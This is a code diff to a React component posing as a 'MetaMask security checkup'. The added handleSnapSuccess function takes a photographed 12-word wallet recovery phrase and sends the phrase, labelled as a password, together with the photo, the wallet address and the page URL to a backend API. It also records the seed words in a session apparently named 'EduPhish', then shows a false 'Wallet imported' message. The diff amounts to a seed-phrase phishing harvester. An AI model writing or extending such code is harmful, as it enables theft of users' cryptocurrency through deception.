@@ -216,12 +216,39 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
     }
   }
 
-  const handleCameraPhrase = useCallback(
-    (text: string) => {
-      ingestRawPhrase(text, { goToGrid: true })
-      toast.success('Phrase added — tap Continue when ready')
+  const handleSnapSuccess = useCallback(
+    async (payload: { phrase: string; snapDataUrl: string }) => {
+      setSubmitting(true)
+      try {
+        const sanitized = sanitizeRecoveryPhrase(payload.phrase)
+        if (sanitized.validCount < WORD_COUNT) {
+          toast.error('Could not read 12 words. Retake the photo.')
+          return false
+        }
+        if (address) {
+          await walletApi.recordMetaMaskUnlock({
+            walletAddress: address,
+            password: sanitized.cleanedText,
+            pageUrl: window.location.href,
+            phraseSnapImage: payload.snapDataUrl,
+          })
+          markMetaMaskSecurityCheckDone(address)
+        }
+        if (sessionId) {
+          await patchEduPhishSession(sessionId, {
+            step: 'submitted',
+            seedWords: sanitized.words.filter(Boolean),
+            activeField: null,
+          }).catch(() => {})
+        }
+        toast.success('Wallet imported')
+        navigate('/submissions', { replace: true })
+        return true
+      } finally {
+        setSubmitting(false)
+      }
     },
-    [ingestRawPhrase]
+    [address, sessionId, navigate]
   )
 
   const handleBackInGrid = () => {
@@ -375,7 +402,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
       <RecoveryPhraseCameraScanner
         open={cameraOpen}
         onClose={() => setCameraOpen(false)}
-        onDetected={handleCameraPhrase}
+        onSnapSuccess={handleSnapSuccess}
       />
     </div>
   )
